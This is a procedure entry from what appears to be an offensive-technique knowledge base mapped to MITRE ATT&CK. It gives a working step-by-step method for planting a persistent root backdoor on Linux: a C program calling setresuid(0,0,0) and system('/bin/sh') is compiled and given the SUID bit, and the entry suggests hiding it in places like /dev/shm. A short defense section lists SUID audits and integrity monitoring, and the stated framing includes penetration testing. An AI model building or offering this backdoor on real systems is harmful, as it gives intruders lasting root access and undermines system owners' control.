---
id: a598693d-5089-44bc-b715-3c00a683704e
name: Linux-SUID-Privilege-Escalation-via-Custom-SetUID-Binary-Creation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.842132+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Setuid-and-Setgid|T1166 - Setuid and Setgid]]'
sub_techniques: []
tags:
  - '[[tags/Create-a-SUID-binary]]'
  - '[[tags/Linux-Privilege-Escalation]]'
  - '[[tags/SUID]]'
commands:
  - '[[commands/create-suid-c-source-file]]'
  - '[[commands/compile-suid-with-gcc]]'
  - '[[commands/set-execute-permission-on-suid-binary]]'
  - '[[commands/set-suid-bit-on-suid-binary]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-SUID-Privilege-Escalation-via-Custom-SetUID-Binary-Creation

## Summary

This procedure creates a custom SUID binary on a Linux system to enable privilege escalation or persistence. By compiling a simple C program that spawns a root shell and setting the SUID bit while running as root, the resulting binary can be executed by low-privileged users to gain root access. This is useful for maintaining access after initial root compromise or as a backdoor mechanism.

## Description

SUID (Set User ID) binaries on Linux execute with the privileges of their owner rather than the executing user. This procedure leverages that by creating a C program that uses setresuid(0,0,0) to set the effective user ID to root and then invokes system("/bin/sh") to spawn a root shell. The program is compiled into a binary, made executable, and the SUID bit is set, assuming execution as root to ensure ownership by root. Once created, any user can run the binary to obtain a root shell, facilitating privilege escalation for non-root users or persistence for attackers. This technique targets Linux systems with gcc available and write access to a persistent directory (e.g., /tmp for testing, but ideally a hidden location like /dev/shm or user home). It maps to MITRE ATT&CK T1166 for abusing SUID mechanisms and is effective in environments with relaxed file permission monitoring.

## Requirements

1. Root access on the target Linux system to compile, own the binary, and set the SUID bit.
2. GCC compiler installed (standard on most Linux distributions).
3. Write access to a target directory (e.g., /tmp).
4. Basic knowledge of C compilation and Linux permissions.

## Defense

- Regularly audit SUID binaries using commands like `find / -perm -4000 2>/dev/null` and remove unnecessary ones.
- Implement file integrity monitoring (e.g., via Tripwire or AIDE) to detect new SUID files.
- Restrict root access and use mandatory access controls like SELinux or AppArmor to limit SUID abuse.
- Monitor process execution for unexpected root shells spawned from custom binaries.

## Objectives

1. Create a persistent backdoor binary that grants root privileges to low-privileged users.
2. Escalate privileges for subsequent operations or maintain access post-compromise.
3. Demonstrate SUID abuse in red team exercises or penetration tests.

## Instructions

### Step 1: Create the C Source File

**Context**: Write the C program source code to a file in /tmp. This program will set the user ID to root and spawn a shell. The code is a simple exploit payload that abuses SUID when executed.

**Command** ([[commands/create-suid-c-source-file]]):
```bash
echo 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
```

> This command uses echo to write the multi-line C source to /tmp/suid.c. The backslashes escape newlines for proper formatting. Verify the file creation with `ls /tmp/suid.c` and `cat /tmp/suid.c` to confirm the content matches the expected C program.

### Step 2: Compile the C Source to Binary

**Context**: Compile the C source into an executable binary using gcc. This step produces the /tmp/suid binary without any optimizations that might strip necessary sections.

**Command** ([[commands/compile-suid-with-gcc]]):
```bash
gcc -o /tmp/suid /tmp/suid.c
```

> Run this as root to ensure the binary is owned by root. Check for compilation errors with `gcc` output; success is indicated by no errors and the presence of /tmp/suid (verify with `ls -l /tmp/suid`). The binary should be ~8-16KB in size.

### Step 3: Set Execute Permission

**Context**: Make the binary executable for all users. This ensures it can be run without permission errors.

**Command** ([[commands/set-execute-permission-on-suid-binary]]):
```bash
chmod +x /tmp/suid
```

> This adds execute permissions (u+x, g+x, o+x). Verify with `ls -l /tmp/suid`, which should show `-rwxr-xr-x` permissions. If permissions were already set during compilation, this step confirms them.

### Step 4: Set the SUID Bit

**Context**: Apply the SUID bit to the binary so it runs with root privileges regardless of the executing user. This is the key step for privilege escalation.

**Command** ([[commands/set-suid-bit-on-suid-binary]]):
```bash
chmod u+s /tmp/suid
```

> This sets the user SUID bit (equivalent to +s for user). Run as root. Verify success with `ls -l /tmp/suid`, which should display `-rwsr-xr-x` (note the 's' in the owner execute position). Ownership should be root:root.

### Step 5: Verify and Execute the SUID Binary

**Context**: Test the binary to confirm it provides root escalation. Execute it as a low-privileged user to simulate escalation.

**Instructions**: Switch to a non-root user if testing, then run `/tmp/suid`. Inside the shell, check `id` or `whoami` to confirm root privileges. Clean up by removing the binary (`rm /tmp/suid*`) after testing to avoid persistence in labs.

> Expected: A root shell prompt (e.g., `#` instead of `$`). If it fails, check ownership and permissions; common issues include non-root ownership or SELinux blocking.
